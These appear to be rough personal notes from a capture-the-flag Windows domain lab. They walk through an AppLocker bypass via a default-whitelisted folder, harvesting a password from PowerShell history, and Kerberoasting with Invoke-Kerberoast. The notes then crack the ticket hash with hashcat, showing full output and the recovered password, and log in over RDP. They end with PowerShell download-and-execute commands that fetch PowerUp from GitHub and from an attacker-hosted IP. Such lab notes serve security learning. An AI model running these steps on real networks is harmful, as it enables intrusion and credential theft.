@@ -1,0 +1,117 @@
+Windows 7 introduces AppLocker
+
+
+
+There are many ways to bypass AppLocker.
+
+If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default. 
+
+Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+Get-Content %corp\dark%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+we get flag,,,
+
+Username: corp\dark
+Password: _QuejVudId6
+
+
+to get 
+setspn -T medin -Q ​ */* 
+
+
+
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+
+we add output to file, 
+
+on line 1166
+Invoke-Kerberoast -OutputFormat Hashcat
+
+then run Kerbroast
+.\Invoke-Kerbroast.ps1
+
+we get hash  (can't seem to copy / paste , room has a split screen can't rpd with dark)
+
+$krb5tgs$23$*fela$corp.local$HTTPfela*$BC1FE3E4CC81ABB946F6EB0AD7051687$1D5DC1EF47A761E0903C3F60606DD2675AD35B1EC6738C87C593F6CE477190988D4225D1ABE7616030E48380680535FE1CE3588F04ADECDBD332DD0B5108391E2161E4BBCE69AAF5708AF88DEBB7A0AB18DA31FC34EC6E1A40D25A25C21D51E82E3BBA11277774D8BCB7C54B94EC94F1E3C4106E2537122C77A4BB444C02DB0D01365C098662B6E416FB4620DC9EF83BA99B7F5A2C2F49687A19FD485115EAAA8A10E34042D93D407FB7D933A84A89068158F8450300010C118A90A89372C9BE36FA35350E434084517D2D0557C1AA30953066ACBE0E0122ADA8652540EA346F073E7D396BB45469DD8A8E7036DB806282A409EE6206F1226188E2716197594DB9E35C89414CF744B3D0AB3D30000D717936CCFA67CC3AF793FFFF15357845A6C3159B5AB35F36AE38BF4849C2FEE2E5963A8A39C9D32A1A5FF3425DCAA244FAB1D66C31D62E052095085A342337ADC6BD5CB928137C8B51A28809CC39F7BD59292B219FD05725F9352E493274448B9E91B847641775E642FF127954890FB3DC256508A9677BDDD56DA655FBB93574A0901258C45C4FC8C361A70C48CD907BCDA0381A2F64E1668CDEEF524C4CD8E77EE33650566496618404D186C7135C7041CC2C6DF3DBD2F7CD28234B2E12E3491E0E6D0604D769EECA46FB5B14B6720EF2709E2F4FDB762DC3DB9B7F36648F32C5A4E5FA21DDC970323053B037A274559B329CE46F8FE9A4A06D6E2833488D766DF1AEF8C593309F59CD8FB492F98F2B987656424DD116AC603D943AE680EA628B047F4CDD2E116BAE5CFB6F7757FF5926265712076D255CB7843C746698CA027D2F26823E7646953B4912D839741FCD82EDC0AE2AF31070994C713295C43D1D9098BEA2211E449C4E5012F51CB2743FF9603864050AE9BA5E21B09C1C7225CF8068F3351E8F26ECB4069ACAB198E97FE5CE98C18ECBA9700D6F1B40166DF254C8CFB9B02C4D19CAE2B7ECF2C30FD6A0654BE8939F83EB357B308827029A1FCC46A2DE0DE6E5171CF4E68E5574926CF550783E47ACDAC5CB67311C39C115C1B9E7AFFEDFE5BA0CED9085A882A3559506341C611EAA950443ACD64A05E2313ACE848685B981795A91EDC67FEA48DFD081D4D6B2E6909A3DF0C2762DEE766062AA39AC8AAF610BC8EE09E7D1D54E65BF3DCCD42530274F99CE37FC787DB1DA2282A12D248CF454DFA73FD54235A66132A2182E9ECD5C6A9100961E1EA57BF661E1721FD6F2DE02ECCD229C06D6DA73316A09847AAC3E0AA7C8E5D2A83CEB6EF20F057EB89C58A98C624D8DE8AD0B7637B9BCF42468F216A4204B8F112F2EEADDF1B5B498A05A2E23B55C3C1D60ADDC58C664045838CC158DAA5799518C635308267F9DB6DF842B39D294D603C5C2B7D6D951D3
+
+
+                                                                               
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 13100 -a 0 root1 /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.1.1) starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2708/2772 MB (1024 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 99 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81abb946f6eb0ad7051687$1d5dc1ef47a761e0903c3f60606dd2675ad35b1ec6738c87c593f6ce477190988d4225d1abe7616030e48380680535fe1ce3588f04adecdbd332dd0b5108391e2161e4bbce69aaf5708af88debb7a0ab18da31fc34ec6e1a40d25a25c21d51e82e3bba11277774d8bcb7c54b94ec94f1e3c4106e2537122c77a4bb444c02db0d01365c098662b6e416fb4620dc9ef83ba99b7f5a2c2f49687a19fd485115eaaa8a10e34042d93d407fb7d933a84a89068158f8450300010c118a90a89372c9be36fa35350e434084517d2d0557c1aa30953066acbe0e0122ada8652540ea346f073e7d396bb45469dd8a8e7036db806282a409ee6206f1226188e2716197594db9e35c89414cf744b3d0ab3d30000d717936ccfa67cc3af793ffff15357845a6c3159b5ab35f36ae38bf4849c2fee2e5963a8a39c9d32a1a5ff3425dcaa244fab1d66c31d62e052095085a342337adc6bd5cb928137c8b51a28809cc39f7bd59292b219fd05725f9352e493274448b9e91b847641775e642ff127954890fb3dc256508a9677bddd56da655fbb93574a0901258c45c4fc8c361a70c48cd907bcda0381a2f64e1668cdeef524c4cd8e77ee33650566496618404d186c7135c7041cc2c6df3dbd2f7cd28234b2e12e3491e0e6d0604d769eeca46fb5b14b6720ef2709e2f4fdb762dc3db9b7f36648f32c5a4e5fa21ddc970323053b037a274559b329ce46f8fe9a4a06d6e2833488d766df1aef8c593309f59cd8fb492f98f2b987656424dd116ac603d943ae680ea628b047f4cdd2e116bae5cfb6f7757ff5926265712076d255cb7843c746698ca027d2f26823e7646953b4912d839741fcd82edc0ae2af31070994c713295c43d1d9098bea2211e449c4e5012f51cb2743ff9603864050ae9ba5e21b09c1c7225cf8068f3351e8f26ecb4069acab198e97fe5ce98c18ecba9700d6f1b40166df254c8cfb9b02c4d19cae2b7ecf2c30fd6a0654be8939f83eb357b308827029a1fcc46a2de0de6e5171cf4e68e5574926cf550783e47acdac5cb67311c39c115c1b9e7affedfe5ba0ced9085a882a3559506341c611eaa950443acd64a05e2313ace848685b981795a91edc67fea48dfd081d4d6b2e6909a3df0c2762dee766062aa39ac8aaf610bc8ee09e7d1d54e65bf3dccd42530274f99ce37fc787db1da2282a12d248cf454dfa73fd54235a66132a2182e9ecd5c6a9100961e1ea57bf661e1721fd6f2de02eccd229c06d6da73316a09847aac3e0aa7c8e5d2a83ceb6ef20f057eb89c58a98c624d8de8ad0b7637b9bcf42468f216a4204b8f112f2eeaddf1b5b498a05a2e23b55c3c1d60addc58c664045838cc158daa5799518c635308267f9db6df842b39d294d603c5c2b7d6d951d3:rubenF124
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81...d951d3
+Time.Started.....: Mon Jun  7 22:24:13 2021, (22 secs)
+Time.Estimated...: Mon Jun  7 22:24:35 2021, (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   196.9 kH/s (8.72ms) @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4132864/14344384 (28.81%)
+Rejected.........: 0/4132864 (0.00%)
+Restore.Point....: 4128768/14344384 (28.78%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: ruddqoo -> ruben5277
+
+Started: Mon Jun  7 22:24:05 2021
+Stopped: Mon Jun  7 22:24:36 2021
+
+
+sudo xfreerdp /dynamic-resolution +clipboard /cert:ignore /u:'corp\fela' /p:rubenF124 /v:10.10.107.71
+
+
+
+iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
+
+but since box has no internet we have to serve it on a platter
+
+iex​(New-Object Net.WebClient).DownloadString('http://10.6.65.43/powerup.ps1') 
+and that does not work
+
+so from write up
+
+powershell -c "(new-object System-Net-Webclient).Downloadfile('http://10.6.65.43:8000/powerup.ps1', 'C:\Users\fela.CORP\Downloads\powerup.ps1')"
+
+
